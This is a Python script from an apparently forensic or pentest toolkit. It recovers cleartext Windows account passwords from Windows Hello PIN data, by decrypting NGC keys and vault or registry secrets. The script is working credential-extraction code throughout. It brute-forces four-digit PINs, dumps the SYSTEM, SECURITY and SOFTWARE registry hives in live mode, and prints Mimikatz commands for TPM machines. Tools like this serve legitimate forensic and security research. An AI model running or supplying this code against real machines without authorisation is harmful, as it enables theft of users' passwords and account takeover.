#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# Copyright 2022, Tijl "Photubias" Deneut <@tijldeneut>
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
r'''
This script mostly calls the other NGC scripts in order, step by step
'''
import optparse, os, sys, importlib
from Crypto.Cipher import PKCS1_v1_5, AES
from Registry.Registry import Registry

ngcparse = importlib.import_module('diana-ngcparse')
ngcregistryparse = importlib.import_module('diana-ngcregistryparse')
ngcvaultdec = importlib.import_module('diana-ngcvaultdec')
ngccryptokeysdec = importlib.import_module('diana-ngccryptokeysdec')

def check_parameters(options, args):
    if not args or len(args) != 1: sys.exit('You must provide the Windows folder.')
    if not options.pin and not options.pinbrute and not options.tpm: sys.exit('You must provide either a PIN or the pinbrute option.')

def reverseByte(bByteInput):
    sReversed = ''
    sHexInput = bByteInput.hex()
    for x in range(-1, -len(str(sHexInput)), -2): sReversed += sHexInput[x-1] + sHexInput[x]
    return bytes.fromhex(sReversed)

def getCryptUsername(sSoftware, sSID):
    with open(sSoftware, 'rb') as oFile:
        oReg = Registry(oFile)
        oRegKey = oReg.open('Microsoft\\Windows\\CurrentVersion\\Authentication\\Credential Providers\\{D6886603-9D2F-4EB2-B667-1971041FA96B}')
        for oKey in oRegKey.subkeys():
            if oKey.name() in sSID:
                return oKey.subkey('UserNames').subkeys()[0].name()
    return '<Unknown>'

def constructRSAKEY(sDATA, verbose = False):
    from Crypto.PublicKey import RSA
    def calcPrivateKey(e,p,q):
        def recurseFunction(a,b):
            if b==0:return (1,0)
            (q,r) = (a//b,a%b)
            (s,t) = recurseFunction(b,r)
            return (t, s-(q*t))
        t = (p-1)*(q-1) ## Euler's totient
        inv = recurseFunction(e,t)[0]
        if inv < 1: inv += t
        return inv
    
    ## Parsing based on (but wrong endian): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/540b7b8b-2232-45c8-9d7c-af7a5d5218ed
    bDATA = bytes.fromhex(sDATA)
    if not bDATA[:4] == b'RSA2': exit('[-] Error: not an RSA key!')
    iBitlen = int(reverseByte(bDATA[4:8]).hex().encode(),16)
    iPubExpLen = int(reverseByte(bDATA[8:12]).hex().encode(),16)
    iModulusLen = int(reverseByte(bDATA[12:16]).hex().encode(),16)
    iPLen = int(reverseByte(bDATA[16:20]).hex().encode(),16)
    iQLen = int(reverseByte(bDATA[20:24]).hex().encode(),16)
    iOffset = 24
    iPubExp = int(reverseByte(bDATA[iOffset:iOffset+iPubExpLen]).hex().encode(),16)
    iOffset += iPubExpLen
    iModulus = int(bDATA[iOffset:iOffset+iModulusLen].hex().encode(),16)
    iOffset += iModulusLen
    iP = int(bDATA[iOffset:iOffset+iPLen].hex().encode(),16)
    iOffset += iPLen
    iQ = int(bDATA[iOffset:iOffset+iQLen].hex().encode(),16)
    if verbose:
        print('[!] BitLength      : ' + str(iBitlen) + ' bit')
        print('[!] Modulus Length : ' + str(iModulusLen) + ' bytes')
        print('[!] Prime Lengths  : ' + str(iPLen) + ' bytes')
    if not iModulus == iP*iQ: exit('[-] Prime numbers do not currespond to the public key')
    iPrivateKey = calcPrivateKey(iPubExp, iP, iQ)
    try: oRSAKEY = RSA.construct((iModulus,iPubExp,iPrivateKey,iP,iQ)) ## oRSAKEY = RSA.construct((n,e,d,p,q))
    except: exit('[-] Error constructing RSA Key')
    return oRSAKEY

def parseDecryptPin(bData, boolVerbose = False):
    if len(bData)<(32*3): exit('[-] Decrypted data not long enough')
    bUnkPin = bData[-(32*3):-(32*2)]
    bDecryptPin = bData[-(32*2):-32]
    bSignPin = bData[-32:]
    if boolVerbose:
        print('Unknown PIN : ' + bUnkPin.hex())
        print('Decrypt PIN : ' + bDecryptPin.hex())
        print('Sign PIN    : ' + bSignPin.hex())
    return bDecryptPin        

def runDecryptRoutine(arrNGCData, arrProtectors, arrItems):
    ## STEP1b: I know, only working with the last of the NGC Files here, TODO: adjust in case multiple accounts have a PIN
    sUserSID = arrNGCData[1]
    bRSAData1 = b''
    sGUID1 = arrNGCData[0]
    for arrProtector in arrProtectors:
        if arrProtector[1] == 'Microsoft Software Key Storage Provider': 
            sGUID1 = arrProtector[2]
            bRSAData1 = arrProtector[4]
        elif arrProtector[1] == 'Microsoft Platform Crypto Provider':
            print('[!] TPM provider detected, consider rerunning with --tpm option')
            boolTPM = True
    for arrItem in arrItems:
        if arrItem[1] == '//9DDC52DB-DC02-4A8C-B892-38DEF4FA748F': sGUID2 = arrItem[3]
    
    ## STEP2: Get User EncData (encrypted AES Key), AES IV and AES Encrypted Password
    if options.registry:
        ## Get it from Registry
        arrUsers = ngcregistryparse.main(sSOFTWAREHive, boolOutput = False) ## Array of Users with SID [0], Username [1], list of EncData, IV, EncPassword
        for oUser in arrUsers:
            if oUser[0] in sUserSID:
                sUsername = oUser[1]
                bEncAESKEY = bytes.fromhex(oUser[2][0])
                bAESIV = bytes.fromhex(oUser[2][1])
                bAESDATA = bytes.fromhex(oUser[2][2])
    else:
        ## Get it from the Vault
        print('[!] Decrypting vault, hold on ...')
        ##> When the accounts are MSAccount or AzureAD, there will be no vault
        arrResult = ngcvaultdec.main(sVaultFolder, sSystemMasterKeyFolder, sSYSTEMHive, sSECURITYHive, sSOFTWAREHive, sUserSID, False)
        sUsername = arrResult[0]
        bEncAESKEY = bytes.fromhex(arrResult[1][0])
        bAESIV = bytes.fromhex(arrResult[1][1])
        bAESDATA = bytes.fromhex(arrResult[1][2])
    print('[+] Working on : ' + sUsername + ' (' + sUserSID + ')')
    
    ## STEP3a: Get decrypted RSA Keys for first GUID from Crypto Folder
    if not options.tpm:
        print('[!] Decrypting crypto keys, this might take a while')
        if options.pinbrute: 
            sPIN = ''
            print('     PIN Bruteforce selected, this will take even longer ;-)')
        else: sPIN = options.pin
        #print(ngccryptokeysdec.main(sCryptoFolder, sSystemMasterKeyFolder, sSYSTEMHive, sSECURITYHive, sPIN, sGUID1, True).hex())
        try: sRSAKEY1 = ngccryptokeysdec.main(sCryptoFolder, sSystemMasterKeyFolder, sSYSTEMHive, sSECURITYHive, sPIN, sGUID1, False).hex()
        except: 
            print('[-] Error: PIN wrong or key in TPM? In case of TPM rerun with --tpm')
            return
        oRSAKEY1 = constructRSAKEY(sRSAKEY1)
        oCipher1 = PKCS1_v1_5.new(oRSAKEY1)
    
    ## STEP3b: Use RSA KEY to decrypt the NGC Input Data (or ask for the Decryption key)
    if options.tpm:
        print('[!] TPM option selected, let\'s get the DecryptPIN from TPM, this requires live access to run')
        print('     Mimikatz; privilege::debug, token::elevate, ngc::pin /pin:<THEPIN> /guid:{}'.format(sGUID1))
        print('     Or use DecryptWithTPM.exe {} <THEPIN>'.format(sGUID1))
        sDecryptPin = input('[?] Please copy paste just the "DECRYPTPIN" : ')
    else:
        try: bDecrRSAData1 = oCipher1.decrypt(bRSAData1, b'')
        except: exit('[-] Error decrypting the inputdata')
        sDecryptPin = parseDecryptPin(bDecrRSAData1).hex() ## Add "verbose=True" to get Decr PIN, Sign PIN and Unk PIN
    print('[!] Trying to decrypt user password')
    
    ## STEP4a: Get decrypted RSA Keys for second GUID from Crypto Folder
    sRSAKEY2 = ngccryptokeysdec.main(sCryptoFolder, sSystemMasterKeyFolder, sSYSTEMHive, sSECURITYHive, sDecryptPin, sGUID2, False).hex()
    oRSAKEY2 = constructRSAKEY(sRSAKEY2)
    oCipher2 = PKCS1_v1_5.new(oRSAKEY2)
    
    ## STEP4b: Decrypt AES key from Vault or Registry
    bAESKEY = oCipher2.decrypt(bEncAESKEY,b'')
    oCipher3 = AES.new(bAESKEY, AES.MODE_CBC, bAESIV)
    bCleartextResult = oCipher3.decrypt(bAESDATA)
    print('[+] User password : ' + bCleartextResult.decode('UTF-16LE').split('\x00')[0])
    #print('  ' + bCleartextResult.decode('UTF-16LE').split('\x00')[0])
    return
        
if __name__ == '__main__':
    """Utility core."""
    usage = (
        'usage: %prog windows_folder\n\n'
        'It calls and parses the other scripts to extract cleartext Windows Passwords\n'
        'Make sure to run as SYSTEM when done on live Windows environment')

    parser = optparse.OptionParser(usage=usage)
    parser.add_option('--pin', metavar='STRING', dest='pin', help='Windows Hello PIN')
    parser.add_option('--pinbrute', metavar='BOOL', dest='pinbrute', action="store_true", help='... or brute force PIN 0000 to 9999')
    parser.add_option('--registry', metavar='BOOL', dest='registry', action="store_true", help='Use SOFTWARE registry instead of Vault to extract password')
    parser.add_option('--live', metavar='BOOL', dest='live', action="store_true", help='Required for a live run to dump Registry Hives, run as SYSTEM')
    parser.add_option('--tpm', metavar='BOOL', dest='tpm', action="store_true", help='Will tell you what to do with TPM systems')
    
    (options, args) = parser.parse_args()
    check_parameters(options, args)
    
    sWindowsbase = args[0]
    sNGCFolder = os.path.join(sWindowsbase, 'ServiceProfiles','LocalService','AppData','Local','Microsoft','Ngc')
    sCryptoFolder = os.path.join(sWindowsbase, 'ServiceProfiles', 'LocalService', 'AppData', 'Roaming', 'Microsoft', 'Crypto', 'Keys')
    sSystemMasterKeyFolder = os.path.join(sWindowsbase, 'System32', 'Microsoft', 'Protect', 'S-1-5-18', 'User')
    sVaultFolder = os.path.join(sWindowsbase, 'System32', 'config', 'systemprofile', 'AppData', 'Local', 'Microsoft', 'Vault', '4BF4C442-9B8A-41A0-B380-DD4A704DDB28')
    
    if not options.live:
        sSOFTWAREHive = os.path.join(sWindowsbase, 'System32', 'config', 'SOFTWARE')
        sSYSTEMHive = os.path.join(sWindowsbase, 'System32', 'config', 'SYSTEM')
        sSECURITYHive = os.path.join(sWindowsbase, 'System32', 'config', 'SECURITY')
    else:
        sSOFTWAREHive = 'SOFTWARE'
        sSYSTEMHive = 'SYSTEM'
        sSECURITYHive = 'SECURITY'
        os.system(r'REG.exe SAVE HKLM\SYSTEM SYSTEM /Y >nul 2>&1')
        os.system(r'REG.exe SAVE HKLM\SECURITY SECURITY /Y >nul 2>&1')
        os.system(r'REG.exe SAVE HKLM\SOFTWARE SOFTWARE /Y >nul 2>&1')

    for x in [sNGCFolder, sCryptoFolder, sSystemMasterKeyFolder, sVaultFolder, sWindowsbase, sSOFTWAREHive, sSYSTEMHive, sSECURITYHive]: 
        if not os.path.exists(x): exit('Error finding file/folder "{}"'.format(x))

    ## STEP1a: NGC Folders
    arrResults = ngcparse.main(sNGCFolder, boolOutput = False) ## Array of NGC GUID METADATA [0], PROTECTOR list [1] and ITEM list [2]
    
    print('[+] Found {} NGC folders, attempting to decrypt now\n'.format(len(arrResults)))

    for lItem in arrResults:
        runDecryptRoutine(lItem[0], lItem[1], lItem[2])
        print('=' * 50)

    if options.live: ## Clean Up
        os.system('DEL SYSTEM')
        os.system('DEL SECURITY')
        os.system('DEL SOFTWARE')
